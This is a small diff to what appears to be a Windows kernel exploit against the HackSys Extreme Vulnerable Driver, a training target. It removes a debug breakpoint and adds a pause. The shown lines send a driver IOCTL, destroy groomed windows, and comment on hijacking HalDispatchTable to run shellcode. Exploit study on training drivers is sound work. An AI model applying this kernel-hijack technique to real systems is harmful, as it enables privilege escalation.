@@ -275,7 +275,7 @@ int main()
 	//拷贝前断点bp hevd+450FE
 	DeviceIoControl(hDriver, 0x222043, buf, 0x1fc, 0, 0, dwBytesOut, NULL);
 	printf("DestroyWindow....... \n");
-	DebugBreak();
+
 	for (int i = 0; i < num; i++) {
 		if (extraMemFindWindow[i])
 		{
@@ -337,6 +337,7 @@ int main()
 			DestroyWindow(extraMemFindWindow[i]);
 		}
 	}
+	getchar();
 	printf("shellcode....... \n");
 	//When the kernel tries to execute nt!HalDispatchTable+0x4 it will end up executing at 0x1208
 	//Which has been preloaded with opcodes to execute our shellcode and then return
